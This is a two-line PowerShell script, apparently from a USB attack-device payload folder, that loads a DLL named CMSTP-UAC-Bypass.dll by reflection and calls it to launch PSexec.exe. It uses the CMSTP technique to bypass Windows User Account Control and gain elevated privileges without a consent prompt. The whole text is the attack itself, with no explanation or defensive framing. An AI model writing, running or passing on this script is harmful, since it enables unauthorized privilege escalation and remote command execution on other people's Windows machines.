[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("E:\payloads\switch1\CMSTP-UAC-Bypass.dll"))
[CMSTPBypass]::Execute("E:\payloads\switch1\PSexec.exe")